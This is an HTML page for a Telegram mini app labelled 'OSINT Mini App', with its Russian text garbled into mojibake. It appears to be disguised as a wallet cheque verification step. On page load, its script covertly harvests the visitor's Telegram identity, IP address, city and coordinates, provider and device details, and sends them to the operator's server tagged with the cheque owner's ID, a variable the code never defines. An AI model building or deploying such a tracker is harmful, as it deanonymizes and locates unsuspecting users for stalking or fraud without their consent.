<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT Mini App</title>
    <script>
        const API_URL = '/send_data';  // URL, –∫—É–¥–∞ –±—É–¥–µ–º –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä

        function sendToTelegram(message) {
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            fetch(API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ message: message })
            })
            .then(response => response.json())
            .then(data => {
                console.log(data); // –õ–æ–≥–∏—Ä—É–µ–º –æ—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞
            })
            .catch(error => {
                console.error('–û—à–∏–±–∫–∞:', error);
            });
        }

        function collectData() {
            let logData = `–õ–æ–≥ —É—Å–ø–µ—à–µ–Ω! [${new Date().toLocaleString()}]\n\n`;

            // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.ready();
                const user = Telegram.WebApp.initDataUnsafe.user;
                if (user) {
                    logData += `üîç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ:\n`;
                    logData += `‚îú Username: @${user.username || '–ù–µ —É–∫–∞–∑–∞–Ω'}\n`;
                    logData += `‚îú –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä (ID): ${user.id}\n`;
                    logData += `‚îú –ò–º—è: ${user.first_name} ${user.last_name || '–Ω–µ –∑–∞–¥–∞–Ω–æ'}\n`;
                    logData += `‚îú –ü—Ä–µ–º–∏—É–º: –Ω–µ—Ç\n`;
                    logData += `‚îú –Ø–∑—ã–∫: ${Telegram.WebApp.initDataUnsafe.language_code}\n`;
                    logData += `‚îî –ú–æ–∂–µ—Ç –ø–∏—Å–∞—Ç—å –≤ –õ–°: –¥–∞\n\n`;
                }
            }

            // –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    fetch(`https://ipinfo.io/${data.ip}/json`)
                        .then(response => response.json())
                        .then(info => {
                            logData += `üñ•Ô∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:\n`;
                            logData += `‚îú IP: ${data.ip}\n`;
                            logData += `‚îú –û–°: ${navigator.platform}\n`;
                            logData += `‚îú –Ø–¥—Ä–æ –û–°: ${navigator.platform}\n`;
                            logData += `‚îú –í–µ—Ä—Å–∏—è –û–°: ${navigator.appVersion}\n`;
                            logData += `‚îú –ò–º—è –û–°: ${navigator.userAgent}\n`;
                            logData += `‚îú –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${getDeviceType()}\n`;
                            logData += `‚îú –¢–∏–ø —Å–µ—Ç–∏: Wi-Fi / Ethernet\n`;
                            logData += `‚îú –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${window.screen.width}x${window.screen.height}\n\n`;

                            logData += `üåê –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ:\n`;
                            logData += `‚îú UserAgent: ${navigator.userAgent}\n`;
                            logData += `‚îú –ù–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞: ${navigator.appName}\n`;
                            logData += `‚îú –í–µ—Ä—Å–∏—è –±—Ä–∞—É–∑–µ—Ä–∞: ${navigator.appVersion}\n`;
                            logData += `‚îî –¢–∏–ø –¥–≤–∏–∂–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞: ${navigator.product}\n\n`;

                            logData += `üëª –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± IP:\n`;
                            logData += `‚îú –ö–æ–Ω—Ç–∏–Ω–µ–Ω—Ç: Asia\n`;
                            logData += `‚îú –°—Ç—Ä–∞–Ω–∞: ${info.country || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –†–µ–≥–∏–æ–Ω: ${info.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –ì–æ—Ä–æ–¥: ${info.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${info.timezone || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –®–∏—Ä–æ—Ç–∞: ${info.loc.split(',')[0] || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –î–æ–ª–≥–æ—Ç–∞: ${info.loc.split(',')[1] || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îú –í–∞–ª—é—Ç–∞: UZS\n`;
                            logData += `‚îú –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${info.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `‚îî VPN or Proxy (–ø—Ä–∏–º–µ—Ä–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç): –Ω–µ—Ç\n\n`;

                            logData += `–í–ª–∞–¥–µ–ª–µ—Ü —á–µ–∫–∞: ${CHAT_ID}`;
                            sendToTelegram(logData);
                        })
                        .catch(error => console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –æ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', error));
                })
                .catch(error => console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP:', error));
        }

        function getDeviceType() {
            if (/mobile/i.test(navigator.userAgent)) {
                return '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ';
            } else if (/tablet/i.test(navigator.userAgent)) {
                return '–ü–ª–∞–Ω—à–µ—Ç';
            } else {
                return '–ü–ö';
            }
        }

        window.onload = collectData;  // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    </script>
</head>
<body>
    <h2>OSINT Mini App</h2>
    <p>–î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è...</p>
    <button onclick="window.location.href='https://t.me/walletrussiarbot/verify'">–ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</button>
</body>
</html>
